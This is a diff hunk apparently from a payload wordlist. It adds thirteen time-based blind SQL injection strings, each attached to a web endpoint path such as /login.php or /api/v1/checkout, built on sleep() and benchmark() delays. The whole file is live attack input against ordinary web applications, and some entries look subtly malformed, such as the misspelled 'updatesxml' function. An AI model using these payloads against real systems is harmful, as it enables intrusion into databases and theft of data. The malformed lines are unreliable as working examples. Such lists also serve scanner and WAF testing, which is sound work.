@@ -21,7 +21,20 @@
 /api/v4/gate?id=1|' or (select * from (select(sleep(4)))a) union select 1--
 /login.php?user=1|')) or (select(sleep(3)))#
 /search.php?query=1|' and (select 2323 from (select(sleep(2)))a) and '1'='1
-/app/auth?token=1|" or (select 1 from (select(sleep(3)))x) or "1"="1
+/app/auth?token=1|" or (select 1 from(select(sleep(3)))x) or "1"="1
 /index.php?id=1|' and 2212=benchmark(5000000,sha1(1))--
 /admin/dash?p=1|' and (select(sleep(4))) order by 1--
 /api/v2/items?cat=1|' and (select(sleep(3))) procedure analyse()--
+/profile.php?user=1|' and (select 1 from (select(sleep(5)))k) or 'a'='a
+/api/v1/checkout?id=1|' or (select * from (select(sleep(3)))b) and '1'='1
+/member.php?action=view|' and updatesxml(1,concat(0x3a,(select(sleep(3)))),1)--
+/api/v3/metrics?q=1|' and extractvalue(1,concat(0x3a,(select(sleep(4)))))--
+/cart.php?item=1|' and json_keys((select convert((select(sleep(3))) using utf8)))--
+/api/v2/auth/login|") or (select 4421 from (select(sleep(4)))x) or ("1"="1
+/blog.php?id=1|' and (select 1 from (select(sleep(5)))a) procedure analyse(extractvalue(1,1),1)--
+/api/v1/download?file=1|' and (select 1 from(select(sleep(3)))x) union select '1'--
+/index.php?page=home|' xor (select 1 from (select(sleep(4)))a) xor '1'='1
+/api/v2/track?ip=1|' and 3121=benchmark(6000000,md5(now()))--
+/user/update?id=1|')) and (select 1 from (select(sleep(3)))x) and (('1'='1
+/api/v3/search?query=test|' or (select 1 from (select(sleep(4)))a) is null--
+/gallery.php?id=1|' and (select 1 from (select(sleep(3)))a) in (1,2,3)--
